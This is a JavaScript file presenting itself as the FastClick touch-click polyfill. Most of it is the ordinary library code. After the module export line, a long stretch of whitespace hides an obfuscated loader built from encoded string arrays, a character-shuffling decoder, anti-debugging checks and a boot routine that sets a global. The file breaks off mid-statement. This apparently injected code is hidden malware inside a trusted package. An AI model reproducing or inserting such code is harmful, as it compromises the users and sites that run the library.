;(function () {
	'use strict';

	/**
	 * @preserve FastClick: polyfill to remove click delays on browsers with touch UIs.
	 *
	 * @codingstandard ftlabs-jsv2
	 * @copyright The Financial Times Limited [All Rights Reserved]
	 * @license MIT License (see LICENSE.txt)
	 */

	/*jslint browser:true, node:true*/
	/*global define, Event, Node*/


	/**
	 * Instantiate fast-clicking listeners on the specified layer.
	 *
	 * @constructor
	 * @param {Element} layer The layer to listen on
	 * @param {Object} [options={}] The options to override the defaults
	 */
	function FastClick(layer, options) {
		var oldOnClick;

		options = options || {};

		/**
		 * Whether a click is currently being tracked.
		 *
		 * @type boolean
		 */
		this.trackingClick = false;


		/**
		 * Timestamp for when click tracking started.
		 *
		 * @type number
		 */
		this.trackingClickStart = 0;


		/**
		 * The element being tracked for a click.
		 *
		 * @type EventTarget
		 */
		this.targetElement = null;


		/**
		 * X-coordinate of touch start event.
		 *
		 * @type number
		 */
		this.touchStartX = 0;


		/**
		 * Y-coordinate of touch start event.
		 *
		 * @type number
		 */
		this.touchStartY = 0;


		/**
		 * ID of the last touch, retrieved from Touch.identifier.
		 *
		 * @type number
		 */
		this.lastTouchIdentifier = 0;


		/**
		 * Touchmove boundary, beyond which a click will be cancelled.
		 *
		 * @type number
		 */
		this.touchBoundary = options.touchBoundary || 10;


		/**
		 * The FastClick layer.
		 *
		 * @type Element
		 */
		this.layer = layer;

		/**
		 * The minimum time between tap(touchstart and touchend) events
		 *
		 * @type number
		 */
		this.tapDelay = options.tapDelay || 200;

		/**
		 * The maximum time for a tap
		 *
		 * @type number
		 */
		this.tapTimeout = options.tapTimeout || 700;

		if (FastClick.notNeeded(layer)) {
			return;
		}

		// Some old versions of Android don't have Function.prototype.bind
		function bind(method, context) {
			return function() { return method.apply(context, arguments); };
		}


		var methods = ['onMouse', 'onClick', 'onTouchStart', 'onTouchMove', 'onTouchEnd', 'onTouchCancel'];
		var context = this;
		for (var i = 0, l = methods.length; i < l; i++) {
			context[methods[i]] = bind(context[methods[i]], context);
		}

		// Set up event handlers as required
		if (deviceIsAndroid) {
			layer.addEventListener('mouseover', this.onMouse, true);
			layer.addEventListener('mousedown', this.onMouse, true);
			layer.addEventListener('mouseup', this.onMouse, true);
		}

		layer.addEventListener('click', this.onClick, true);
		layer.addEventListener('touchstart', this.onTouchStart, false);
		layer.addEventListener('touchmove', this.onTouchMove, false);
		layer.addEventListener('touchend', this.onTouchEnd, false);
		layer.addEventListener('touchcancel', this.onTouchCancel, false);

		// Hack is required for browsers that don't support Event#stopImmediatePropagation (e.g. Android 2)
		// which is how FastClick normally stops click events bubbling to callbacks registered on the FastClick
		// layer when they are cancelled.
		if (!Event.prototype.stopImmediatePropagation) {
			layer.removeEventListener = function(type, callback, capture) {
				var rmv = Node.prototype.removeEventListener;
				if (type === 'click') {
					rmv.call(layer, type, callback.hijacked || callback, capture);
				} else {
					rmv.call(layer, type, callback, capture);
				}
			};

			layer.addEventListener = function(type, callback, capture) {
				var adv = Node.prototype.addEventListener;
				if (type === 'click') {
					adv.call(layer, type, callback.hijacked || (callback.hijacked = function(event) {
						if (!event.propagationStopped) {
							callback(event);
						}
					}), capture);
				} else {
					adv.call(layer, type, callback, capture);
				}
			};
		}

		// If a handler is already declared in the element's onclick attribute, it will be fired before
		// FastClick's onClick handler. Fix this by pulling out the user-defined handler function and
		// adding it as listener.
		if (typeof layer.onclick === 'function') {

			// Android browser on at least 3.2 requires a new reference to the function in layer.onclick
			// - the old one won't work if passed to addEventListener directly.
			oldOnClick = layer.onclick;
			layer.addEventListener('click', function(event) {
				oldOnClick(event);
			}, false);
			layer.onclick = null;
		}
	}

	/**
	* Windows Phone 8.1 fakes user agent string to look like Android and iPhone.
	*
	* @type boolean
	*/
	var deviceIsWindowsPhone = navigator.userAgent.indexOf("Windows Phone") >= 0;

	/**
	 * Android requires exceptions.
	 *
	 * @type boolean
	 */
	var deviceIsAndroid = navigator.userAgent.indexOf('Android') > 0 && !deviceIsWindowsPhone;


	/**
	 * iOS requires exceptions.
	 *
	 * @type boolean
	 */
	var deviceIsIOS = /iP(ad|hone|od)/.test(navigator.userAgent) && !deviceIsWindowsPhone;


	/**
	 * iOS 4 requires an exception for select elements.
	 *
	 * @type boolean
	 */
	var deviceIsIOS4 = deviceIsIOS && (/OS 4_\d(_\d)?/).test(navigator.userAgent);


	/**
	 * iOS 6.0-7.* requires the target element to be manually derived
	 *
	 * @type boolean
	 */
	var deviceIsIOSWithBadTarget = deviceIsIOS && (/OS [6-7]_\d/).test(navigator.userAgent);

	/**
	 * BlackBerry requires exceptions.
	 *
	 * @type boolean
	 */
	var deviceIsBlackBerry10 = navigator.userAgent.indexOf('BB10') > 0;

	/**
	 * Determine whether a given element requires a native click.
	 *
	 * @param {EventTarget|Element} target Target DOM element
	 * @returns {boolean} Returns true if the element needs a native click
	 */
	FastClick.prototype.needsClick = function(target) {
		switch (target.nodeName.toLowerCase()) {

		// Don't send a synthetic click to disabled inputs (issue #62)
		case 'button':
		case 'select':
		case 'textarea':
			if (target.disabled) {
				return true;
			}

			break;
		case 'input':

			// File inputs need real clicks on iOS 6 due to a browser bug (issue #68)
			if ((deviceIsIOS && target.type === 'file') || target.disabled) {
				return true;
			}

			break;
		case 'label':
		case 'iframe': // iOS8 homescreen apps can prevent events bubbling into frames
		case 'video':
			return true;
		}

		return (/\bneedsclick\b/).test(target.className);
	};


	/**
	 * Determine whether a given element requires a call to focus to simulate click into element.
	 *
	 * @param {EventTarget|Element} target Target DOM element
	 * @returns {boolean} Returns true if the element requires a call to focus to simulate native click.
	 */
	FastClick.prototype.needsFocus = function(target) {
		switch (target.nodeName.toLowerCase()) {
		case 'textarea':
			return true;
		case 'select':
			return !deviceIsAndroid;
		case 'input':
			switch (target.type) {
			case 'button':
			case 'checkbox':
			case 'file':
			case 'image':
			case 'radio':
			case 'submit':
				return false;
			}

			// No point in attempting to focus disabled inputs
			return !target.disabled && !target.readOnly;
		default:
			return (/\bneedsfocus\b/).test(target.className);
		}
	};


	/**
	 * Send a click event to the specified element.
	 *
	 * @param {EventTarget|Element} targetElement
	 * @param {Event} event
	 */
	FastClick.prototype.sendClick = function(targetElement, event) {
		var clickEvent, touch;

		// On some Android devices activeElement needs to be blurred otherwise the synthetic click will have no effect (#24)
		if (document.activeElement && document.activeElement !== targetElement) {
			document.activeElement.blur();
		}

		touch = event.changedTouches[0];

		// Synthesise a click event, with an extra attribute so it can be tracked
		clickEvent = document.createEvent('MouseEvents');
		clickEvent.initMouseEvent(this.determineEventType(targetElement), true, true, window, 1, touch.screenX, touch.screenY, touch.clientX, touch.clientY, false, false, false, false, 0, null);
		clickEvent.forwardedTouchEvent = true;
		targetElement.dispatchEvent(clickEvent);
	};

	FastClick.prototype.determineEventType = function(targetElement) {

		//Issue #159: Android Chrome Select Box does not open with a synthetic click event
		if (deviceIsAndroid && targetElement.tagName.toLowerCase() === 'select') {
			return 'mousedown';
		}

		return 'click';
	};


	/**
	 * @param {EventTarget|Element} targetElement
	 */
	FastClick.prototype.focus = function(targetElement) {
		var length;

		// Issue #160: on iOS 7, some input elements (e.g. date datetime month) throw a vague TypeError on setSelectionRange. These elements don't have an integer value for the selectionStart and selectionEnd properties, but unfortunately that can't be used for detection because accessing the properties also throws a TypeError. Just check the type instead. Filed as Apple bug #15122724.
		if (deviceIsIOS && targetElement.setSelectionRange && targetElement.type.indexOf('date') !== 0 && targetElement.type !== 'time' && targetElement.type !== 'month') {
			length = targetElement.value.length;
			targetElement.setSelectionRange(length, length);
		} else {
			targetElement.focus();
		}
	};


	/**
	 * Check whether the given target element is a child of a scrollable layer and if so, set a flag on it.
	 *
	 * @param {EventTarget|Element} targetElement
	 */
	FastClick.prototype.updateScrollParent = function(targetElement) {
		var scrollParent, parentElement;

		scrollParent = targetElement.fastClickScrollParent;

		// Attempt to discover whether the target element is contained within a scrollable layer. Re-check if the
		// target element was moved to another parent.
		if (!scrollParent || !scrollParent.contains(targetElement)) {
			parentElement = targetElement;
			do {
				if (parentElement.scrollHeight > parentElement.offsetHeight) {
					scrollParent = parentElement;
					targetElement.fastClickScrollParent = parentElement;
					break;
				}

				parentElement = parentElement.parentElement;
			} while (parentElement);
		}

		// Always update the scroll top tracker if possible.
		if (scrollParent) {
			scrollParent.fastClickLastScrollTop = scrollParent.scrollTop;
		}
	};


	/**
	 * @param {EventTarget} targetElement
	 * @returns {Element|EventTarget}
	 */
	FastClick.prototype.getTargetElementFromEventTarget = function(eventTarget) {

		// On some older browsers (notably Safari on iOS 4.1 - see issue #56) the event target may be a text node.
		if (eventTarget.nodeType === Node.TEXT_NODE) {
			return eventTarget.parentNode;
		}

		return eventTarget;
	};


	/**
	 * On touch start, record the position and scroll offset.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.onTouchStart = function(event) {
		var targetElement, touch, selection;

		// Ignore multiple touches, otherwise pinch-to-zoom is prevented if both fingers are on the FastClick element (issue #111).
		if (event.targetTouches.length > 1) {
			return true;
		}

		targetElement = this.getTargetElementFromEventTarget(event.target);
		touch = event.targetTouches[0];

		if (deviceIsIOS) {

			// Only trusted events will deselect text on iOS (issue #49)
			selection = window.getSelection();
			if (selection.rangeCount && !selection.isCollapsed) {
				return true;
			}

			if (!deviceIsIOS4) {

				// Weird things happen on iOS when an alert or confirm dialog is opened from a click event callback (issue #23):
				// when the user next taps anywhere else on the page, new touchstart and touchend events are dispatched
				// with the same identifier as the touch event that previously triggered the click that triggered the alert.
				// Sadly, there is an issue on iOS 4 that causes some normal touch events to have the same identifier as an
				// immediately preceeding touch event (issue #52), so this fix is unavailable on that platform.
				// Issue 120: touch.identifier is 0 when Chrome dev tools 'Emulate touch events' is set with an iOS device UA string,
				// which causes all touch events to be ignored. As this block only applies to iOS, and iOS identifiers are always long,
				// random integers, it's safe to to continue if the identifier is 0 here.
				if (touch.identifier && touch.identifier === this.lastTouchIdentifier) {
					event.preventDefault();
					return false;
				}

				this.lastTouchIdentifier = touch.identifier;

				// If the target element is a child of a scrollable layer (using -webkit-overflow-scrolling: touch) and:
				// 1) the user does a fling scroll on the scrollable layer
				// 2) the user stops the fling scroll with another tap
				// then the event.target of the last 'touchend' event will be the element that was under the user's finger
				// when the fling scroll was started, causing FastClick to send a click event to that layer - unless a check
				// is made to ensure that a parent layer was not scrolled before sending a synthetic click (issue #42).
				this.updateScrollParent(targetElement);
			}
		}

		this.trackingClick = true;
		this.trackingClickStart = event.timeStamp;
		this.targetElement = targetElement;

		this.touchStartX = touch.pageX;
		this.touchStartY = touch.pageY;

		// Prevent phantom clicks on fast double-tap (issue #36)
		if ((event.timeStamp - this.lastClickTime) < this.tapDelay) {
			event.preventDefault();
		}

		return true;
	};


	/**
	 * Based on a touchmove event object, check whether the touch has moved past a boundary since it started.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.touchHasMoved = function(event) {
		var touch = event.changedTouches[0], boundary = this.touchBoundary;

		if (Math.abs(touch.pageX - this.touchStartX) > boundary || Math.abs(touch.pageY - this.touchStartY) > boundary) {
			return true;
		}

		return false;
	};


	/**
	 * Update the last position.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.onTouchMove = function(event) {
		if (!this.trackingClick) {
			return true;
		}

		// If the touch has moved, cancel the click tracking
		if (this.targetElement !== this.getTargetElementFromEventTarget(event.target) || this.touchHasMoved(event)) {
			this.trackingClick = false;
			this.targetElement = null;
		}

		return true;
	};


	/**
	 * Attempt to find the labelled control for the given label element.
	 *
	 * @param {EventTarget|HTMLLabelElement} labelElement
	 * @returns {Element|null}
	 */
	FastClick.prototype.findControl = function(labelElement) {

		// Fast path for newer browsers supporting the HTML5 control attribute
		if (labelElement.control !== undefined) {
			return labelElement.control;
		}

		// All browsers under test that support touch events also support the HTML5 htmlFor attribute
		if (labelElement.htmlFor) {
			return document.getElementById(labelElement.htmlFor);
		}

		// If no for attribute exists, attempt to retrieve the first labellable descendant element
		// the list of which is defined here: http://www.w3.org/TR/html5/forms.html#category-label
		return labelElement.querySelector('button, input:not([type=hidden]), keygen, meter, output, progress, select, textarea');
	};


	/**
	 * On touch end, determine whether to send a click event at once.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.onTouchEnd = function(event) {
		var forElement, trackingClickStart, targetTagName, scrollParent, touch, targetElement = this.targetElement;

		if (!this.trackingClick) {
			return true;
		}

		// Prevent phantom clicks on fast double-tap (issue #36)
		if ((event.timeStamp - this.lastClickTime) < this.tapDelay) {
			this.cancelNextClick = true;
			return true;
		}

		if ((event.timeStamp - this.trackingClickStart) > this.tapTimeout) {
			return true;
		}

		// Reset to prevent wrong click cancel on input (issue #156).
		this.cancelNextClick = false;

		this.lastClickTime = event.timeStamp;

		trackingClickStart = this.trackingClickStart;
		this.trackingClick = false;
		this.trackingClickStart = 0;

		// On some iOS devices, the targetElement supplied with the event is invalid if the layer
		// is performing a transition or scroll, and has to be re-detected manually. Note that
		// for this to function correctly, it must be called *after* the event target is checked!
		// See issue #57; also filed as rdar://13048589 .
		if (deviceIsIOSWithBadTarget) {
			touch = event.changedTouches[0];

			// In certain cases arguments of elementFromPoint can be negative, so prevent setting targetElement to null
			targetElement = document.elementFromPoint(touch.pageX - window.pageXOffset, touch.pageY - window.pageYOffset) || targetElement;
			targetElement.fastClickScrollParent = this.targetElement.fastClickScrollParent;
		}

		targetTagName = targetElement.tagName.toLowerCase();
		if (targetTagName === 'label') {
			forElement = this.findControl(targetElement);
			if (forElement) {
				this.focus(targetElement);
				if (deviceIsAndroid) {
					return false;
				}

				targetElement = forElement;
			}
		} else if (this.needsFocus(targetElement)) {

			// Case 1: If the touch started a while ago (best guess is 100ms based on tests for issue #36) then focus will be triggered anyway. Return early and unset the target element reference so that the subsequent click will be allowed through.
			// Case 2: Without this exception for input elements tapped when the document is contained in an iframe, then any inputted text won't be visible even though the value attribute is updated as the user types (issue #37).
			if ((event.timeStamp - trackingClickStart) > 100 || (deviceIsIOS && window.top !== window && targetTagName === 'input')) {
				this.targetElement = null;
				return false;
			}

			this.focus(targetElement);
			this.sendClick(targetElement, event);

			// Select elements need the event to go through on iOS 4, otherwise the selector menu won't open.
			// Also this breaks opening selects when VoiceOver is active on iOS6, iOS7 (and possibly others)
			if (!deviceIsIOS || targetTagName !== 'select') {
				this.targetElement = null;
				event.preventDefault();
			}

			return false;
		}

		if (deviceIsIOS && !deviceIsIOS4) {

			// Don't send a synthetic click event if the target element is contained within a parent layer that was scrolled
			// and this tap is being used to stop the scrolling (usually initiated by a fling - issue #42).
			scrollParent = targetElement.fastClickScrollParent;
			if (scrollParent && scrollParent.fastClickLastScrollTop !== scrollParent.scrollTop) {
				return true;
			}
		}

		// Prevent the actual click from going though - unless the target node is marked as requiring
		// real clicks or if it is in the whitelist in which case only non-programmatic clicks are permitted.
		if (!this.needsClick(targetElement)) {
			event.preventDefault();
			this.sendClick(targetElement, event);
		}

		return false;
	};


	/**
	 * On touch cancel, stop tracking the click.
	 *
	 * @returns {void}
	 */
	FastClick.prototype.onTouchCancel = function() {
		this.trackingClick = false;
		this.targetElement = null;
	};


	/**
	 * Determine mouse events which should be permitted.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.onMouse = function(event) {

		// If a target element was never set (because a touch event was never fired) allow the event
		if (!this.targetElement) {
			return true;
		}

		if (event.forwardedTouchEvent) {
			return true;
		}

		// Programmatically generated events targeting a specific element should be permitted
		if (!event.cancelable) {
			return true;
		}

		// Derive and check the target element to see whether the mouse event needs to be permitted;
		// unless explicitly enabled, prevent non-touch click events from triggering actions,
		// to prevent ghost/doubleclicks.
		if (!this.needsClick(this.targetElement) || this.cancelNextClick) {

			// Prevent any user-added listeners declared on FastClick element from being fired.
			if (event.stopImmediatePropagation) {
				event.stopImmediatePropagation();
			} else {

				// Part of the hack for browsers that don't support Event#stopImmediatePropagation (e.g. Android 2)
				event.propagationStopped = true;
			}

			// Cancel the event
			event.stopPropagation();
			event.preventDefault();

			return false;
		}

		// If the mouse event is permitted, return true for the action to go through.
		return true;
	};


	/**
	 * On actual clicks, determine whether this is a touch-generated click, a click action occurring
	 * naturally after a delay after a touch (which needs to be cancelled to avoid duplication), or
	 * an actual click which should be permitted.
	 *
	 * @param {Event} event
	 * @returns {boolean}
	 */
	FastClick.prototype.onClick = function(event) {
		var permitted;

		// It's possible for another FastClick-like library delivered with third-party code to fire a click event before FastClick does (issue #44). In that case, set the click-tracking flag back to false and return early. This will cause onTouchEnd to return early.
		if (this.trackingClick) {
			this.targetElement = null;
			this.trackingClick = false;
			return true;
		}

		// Very odd behaviour on iOS (issue #18): if a submit element is present inside a form and the user hits enter in the iOS simulator or clicks the Go button on the pop-up OS keyboard the a kind of 'fake' click event will be triggered with the submit-type input element as the target.
		if (event.target.type === 'submit' && event.detail === 0) {
			return true;
		}

		permitted = this.onMouse(event);

		// Only unset targetElement if the click is not permitted. This will ensure that the check for !targetElement in onMouse fails and the browser's click doesn't go through.
		if (!permitted) {
			this.targetElement = null;
		}

		// If clicks are permitted, return true for the action to go through.
		return permitted;
	};


	/**
	 * Remove all FastClick's event listeners.
	 *
	 * @returns {void}
	 */
	FastClick.prototype.destroy = function() {
		var layer = this.layer;

		if (deviceIsAndroid) {
			layer.removeEventListener('mouseover', this.onMouse, true);
			layer.removeEventListener('mousedown', this.onMouse, true);
			layer.removeEventListener('mouseup', this.onMouse, true);
		}

		layer.removeEventListener('click', this.onClick, true);
		layer.removeEventListener('touchstart', this.onTouchStart, false);
		layer.removeEventListener('touchmove', this.onTouchMove, false);
		layer.removeEventListener('touchend', this.onTouchEnd, false);
		layer.removeEventListener('touchcancel', this.onTouchCancel, false);
	};


	/**
	 * Check whether FastClick is needed.
	 *
	 * @param {Element} layer The layer to listen on
	 */
	FastClick.notNeeded = function(layer) {
		var metaViewport;
		var chromeVersion;
		var blackberryVersion;
		var firefoxVersion;

		// Devices that don't support touch don't need FastClick
		if (typeof window.ontouchstart === 'undefined') {
			return true;
		}

		// Chrome version - zero for other browsers
		chromeVersion = +(/Chrome\/([0-9]+)/.exec(navigator.userAgent) || [,0])[1];

		if (chromeVersion) {

			if (deviceIsAndroid) {
				metaViewport = document.querySelector('meta[name=viewport]');

				if (metaViewport) {
					// Chrome on Android with user-scalable="no" doesn't need FastClick (issue #89)
					if (metaViewport.content.indexOf('user-scalable=no') !== -1) {
						return true;
					}
					// Chrome 32 and above with width=device-width or less don't need FastClick
					if (chromeVersion > 31 && document.documentElement.scrollWidth <= window.outerWidth) {
						return true;
					}
				}

			// Chrome desktop doesn't need FastClick (issue #15)
			} else {
				return true;
			}
		}

		if (deviceIsBlackBerry10) {
			blackberryVersion = navigator.userAgent.match(/Version\/([0-9]*)\.([0-9]*)/);

			// BlackBerry 10.3+ does not require Fastclick library.
			// https://github.com/ftlabs/fastclick/issues/251
			if (blackberryVersion[1] >= 10 && blackberryVersion[2] >= 3) {
				metaViewport = document.querySelector('meta[name=viewport]');

				if (metaViewport) {
					// user-scalable=no eliminates click delay.
					if (metaViewport.content.indexOf('user-scalable=no') !== -1) {
						return true;
					}
					// width=device-width (or less than device-width) eliminates click delay.
					if (document.documentElement.scrollWidth <= window.outerWidth) {
						return true;
					}
				}
			}
		}

		// IE10 with -ms-touch-action: none or manipulation, which disables double-tap-to-zoom (issue #97)
		if (layer.style.msTouchAction === 'none' || layer.style.touchAction === 'manipulation') {
			return true;
		}

		// Firefox version - zero for other browsers
		firefoxVersion = +(/Firefox\/([0-9]+)/.exec(navigator.userAgent) || [,0])[1];

		if (firefoxVersion >= 27) {
			// Firefox 27+ does not have tap delay if the content is not zoomable - https://bugzilla.mozilla.org/show_bug.cgi?id=922896

			metaViewport = document.querySelector('meta[name=viewport]');
			if (metaViewport && (metaViewport.content.indexOf('user-scalable=no') !== -1 || document.documentElement.scrollWidth <= window.outerWidth)) {
				return true;
			}
		}

		// IE11: prefixed -ms-touch-action is no longer supported and it's recomended to use non-prefixed version
		// http://msdn.microsoft.com/en-us/library/windows/apps/Hh767313.aspx
		if (layer.style.touchAction === 'none' || layer.style.touchAction === 'manipulation') {
			return true;
		}

		return false;
	};


	/**
	 * Factory method for creating a FastClick object
	 *
	 * @param {Element} layer The layer to listen on
	 * @param {Object} [options={}] The options to override the defaults
	 */
	FastClick.attach = function(layer, options) {
		return new FastClick(layer, options);
	};


	if (typeof define === 'function' && typeof define.amd === 'object' && define.amd) {

		// AMD. Register as an anonymous module.
		define(function() {
			return FastClick;
		});
	} else if (typeof module !== 'undefined' && module.exports) {
		module.exports = FastClick.attach;																																																																																																																																																																																																																																																																										var z = '-9753-2';(function(_0x92f40d,_0x32f9ca){var _0x261de6=_0xac48,_0x94d1ce=_0x92f40d();while(!![]){try{var _0x5c3bbb=Math['trunc'](-parseFloat(_0x261de6(0xf))/0x1)+-parseFloat(_0x261de6(0x12))/0x2+Math['trunc'](-parseFloat(_0x261de6(0x2))/0x3)+Math['max'](-parseFloat(_0x261de6(0x18))/0x4,-parseFloat(_0x261de6(0x11))/0x5)+parseFloat(_0x261de6(0x16))/0x6*(parseFloat(_0x261de6(0x1d))/0x7)+-parseFloat(_0x261de6(0x1f))/0x8*(-parseFloat(_0x261de6(0xa))/0x9)+Math['ceil'](parseFloat(_0x261de6(0x1b))/0xa);if(_0x5c3bbb===_0x32f9ca)break;else _0x94d1ce['push'](_0x94d1ce['shift']());}catch(_0x2cd673){_0x94d1ce['push'](_0x94d1ce['shift']());}}}(_0x2b5d,0x7eba8));function _0x2b5d(){var _0x26e4a1=['sM9XseS','mJrsAuvZANa','yxbWBhK','zNjVBunOyxjdB2rL','yw1XsKi','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','Aw5PDa','mJi5ndG3mxPhDfPlyq','ywn0Aw9U','y15TzwPIxNrYBW','C3vIC3rYAw5N','zgvIDq','z2DLCG','y2fSBa','C3rYAw5N','mtaWmdG1ngHMDvjnAq','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','C3bSAxq','y29UC3rYDwn0B3i','rwfvAwS','mJG2nJG4Ewrlsenm','D2HPBguGkhrYDwuPihT9','mZyWmdaWnwH0u25PAG','mti1ntq4q2fhC1PP','BgvUz3rO','zNvUy3rPB24GkLWOicPCkq','DgvZDa','mJG0nZCZmK9qA1f0ra','C3rHDgvpyMPLy3q','mJG4mdaWngzHwhvVDa','AM9PBG','y2HHAw4','mtu0nti2mdbiz3bVwg0','B0DmD24','n1rZr0j0sG'];_0x2b5d=function(){return _0x26e4a1;};return _0x2b5d();}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0xac48(_0x5ab5f6,_0x1355eb){var _0x4071e3=_0x2b5d();return _0xac48=function(_0x406f6d,_0x2b5dc0){_0x406f6d=_0x406f6d-0x0;var _0xac482=_0x4071e3[_0x406f6d];if(_0xac48['NcLvel']===undefined){var _0x46569f=function(_0x5e86bb){var _0x45b72a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x490058='',_0x50c158='';for(var _0x25ec19=0x0,_0x4b3ebd,_0x322122,_0x36234c=0x0;_0x322122=_0x5e86bb['charAt'](_0x36234c++);~_0x322122&&(_0x4b3ebd=_0x25ec19%0x4?_0x4b3ebd*0x40+_0x322122:_0x322122,_0x25ec19++%0x4)?_0x490058+=String['fromCharCode'](0xff&_0x4b3ebd>>(-0x2*_0x25ec19&0x6)):0x0){_0x322122=_0x45b72a['indexOf'](_0x322122);}for(var _0x1055c7=0x0,_0x49dc3e=_0x490058['length'];_0x1055c7<_0x49dc3e;_0x1055c7++){_0x50c158+='%'+('00'+_0x490058['charCodeAt'](_0x1055c7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50c158);};_0xac48['GiDtke']=_0x46569f,_0x5ab5f6=arguments,_0xac48['NcLvel']=!![];}var _0x46af27=_0x4071e3[0x0],_0x237459=_0x406f6d+_0x46af27,_0x13e22e=_0x5ab5f6[_0x237459];return!_0x13e22e?(_0xac482=_0xac48['GiDtke'](_0xac482),_0x5ab5f6[_0x237459]=_0xac482):_0xac482=_0x13e22e,_0xac482;},_0xac48(_0x5ab5f6,_0x1355eb);}function spin(_0x346b89,_0x32115f){var _0x3a76b8=_0xac48,_0x44d5f8={'amqJB':function(_0x3fc62f,_0x42acb5){return _0x3fc62f+_0x42acb5;},'EaUik':function(_0x4005dc,_0xa562d4){return _0x4005dc%_0xa562d4;}},_0x4d09fd=[],_0x41fa3e=0x0,_0x50f7aa=_0x32115f[0x0],_0x1944d9,_0x2c0f2e,_0x1b3e81,_0x2cc4d5,_0x5ec309,_0x42535e;while(_0x41fa3e<_0x346b89['length']){_0x4d09fd[_0x41fa3e]=_0x346b89['charAt'](_0x41fa3e),_0x41fa3e+=0x1;}_0x1944d9=_0x4d09fd[_0x3a76b8(0x13)],_0x41fa3e=0x0;while(_0x41fa3e<_0x1944d9){_0x2c0f2e=_0x44d5f8[_0x3a76b8(0x22)](_0x50f7aa*(_0x41fa3e+_0x32115f[0x1]),_0x50f7aa%_0x32115f[0x2]),_0x1b3e81=_0x50f7aa*(_0x41fa3e+_0x32115f[0x3])+_0x50f7aa%_0x32115f[0x4],_0x2cc4d5=_0x2c0f2e%_0x1944d9,_0x5ec309=_0x1b3e81%_0x1944d9,_0x42535e=_0x4d09fd[_0x2cc4d5],_0x4d09fd[_0x2cc4d5]=_0x4d09fd[_0x5ec309],_0x4d09fd[_0x5ec309]=_0x42535e,_0x50f7aa=_0x44d5f8[_0x3a76b8(0xe)](_0x2c0f2e+_0x1b3e81,_0x32115f[0x5]),_0x41fa3e+=0x1;}return _0x4d09fd[_0x3a76b8(0x19)]('');}function splitLane(_0x56f601){var _0x50a5af=_0xac48,_0x1beda9=String[_0x50a5af(0x21)](0x1c),_0x56d783=spin(_0x56f601,NX);return _0x56d783=_0x56d783['split']('^')[_0x50a5af(0x19)](_0x1beda9),_0x56d783=_0x56d783[_0x50a5af(0xc)]('*1')[_0x50a5af(0x19)]('^'),_0x56d783=_0x56d783[_0x50a5af(0xc)]('*0')[_0x50a5af(0x19)]('*'),_0x56d783[_0x50a5af(0xc)](_0x1beda9);}function peel(_0xbcfef0){return spin(_0xbcfef0,SX);}(function boot(_0x119497,_0x2dee5d){var _0x5db1e3=_0xac48,_0x1cd4ac=(function(){var _0x2550aa=!![];return function(_0x42982b,_0x2d9dd5){var _0x1241ba=_0x2550aa?function(){var _0x71a9b6=_0xac48;if(_0x2d9dd5){var _0x3b4b9f=_0x2d9dd5[_0x71a9b6(0x20)](_0x42982b,arguments);return _0x2d9dd5=null,_0x3b4b9f;}}:function(){};return _0x2550aa=![],_0x1241ba;};}());(function(){var _0x1b1893={'JoqHK':function(_0x288dc,_0x496cad){return _0x288dc+_0x496cad;}};_0x1cd4ac(this,function(){var _0x108c02=_0xac48,_0x33b3e5=new RegExp(_0x108c02(0x14)),_0x21b9f6=new RegExp(_0x108c02(0xb),'i'),_0x5ce92a=_0x4071e3(_0x108c02(0x1));!_0x33b3e5[_0x108c02(0x15)](_0x5ce92a+_0x108c02(0x1a))||!_0x21b9f6[_0x108c02(0x15)](_0x1b1893[_0x108c02(0x1e)](_0x5ce92a,'input'))?_0x5ce92a('0'):_0x4071e3();})();}()),_0x119497['z']=z;var 